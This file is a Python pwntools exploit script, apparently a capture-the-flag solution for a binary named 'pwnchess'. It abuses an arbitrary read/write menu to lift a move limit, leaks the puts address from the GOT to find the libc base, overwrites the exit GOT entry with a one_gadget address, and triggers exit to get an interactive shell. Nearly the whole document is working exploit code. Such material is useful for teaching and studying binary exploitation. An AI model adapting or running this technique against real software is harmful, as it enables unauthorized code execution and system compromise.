#!/usr/bin/env python2
from pwn import *

# You might have to change this depending on the architecture of the binary
context.arch = 'amd64'

# Toggle these variables to turn debugging or remote exploitation on/off
REMOTE = True
DEBUG = False

# Update these to match your environment
FNAME = '../distFiles/pwnchess'
HOST = '127.0.0.1'
PORT = '31337'

elf = ELF(FNAME)
if REMOTE:
    libc = ELF('../distFiles/libc-2.27.so')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def getp():
    if REMOTE:
        p = remote(HOST, PORT)
    elif DEBUG:
        p = process(['gdbserver', 'localhost:1234', FNAME])
    else:
        p = process([FNAME])
    return p

def perf_exit(p):
    p.sendline('3')

def perf_write(p, addr, value):
    p.sendline('2')
    p.recvuntil(': ')
    p.sendline(str(addr))
    p.recvuntil(': ')
    p.sendline(str(value))

def perf_read(p, addr):
    p.sendline('1')
    p.recvuntil(': ')
    p.sendline(str(addr))
    p.recvuntil(' : ')
    ret = p.recvline().strip()
    return eval('0x%s' % ret)

ADDR_MOVES = elf.symbols['moves'] # == 0x602060
GOT_PLT_PUTS = elf.got['puts'] # == 0x602018
GOT_PLT_EXIT = elf.got['exit'] # == 0x602048

p = getp()

# bypass the move limit
perf_write(p, ADDR_MOVES, 0xff)

# leak puts address
puts_leak = 0
for i in range(8):
    puts_leak += perf_read(p, GOT_PLT_PUTS+i) << (8*i)
log.info('Leaked puts address: 0x%x' % puts_leak)

# Calculate base address
libc.address = puts_leak - libc.symbols['puts']
log.info('Libc base address: 0x%x' % libc.address)

if REMOTE:
    # Offset of one_gadget for the remote version of libc
    one_gadget_offset = 0x10a38c
else:
    # Offset of one_gadget for my local version of libc
    # You will need to change this to match your version of libc!!!
    one_gadget_offset = 0x106ef8
# calculate from libc base address to get runtime address
one_gadget_addr = libc.address + one_gadget_offset
# write the one_gadget address to GOT entry for 'exit'
for i in range(8):
    b = (one_gadget_addr >> (8*i)) & 0xff
    perf_write(p, GOT_PLT_EXIT+i, b)
# invoke exit (which now points to our one_gadget address)
perf_exit(p)

p.interactive()
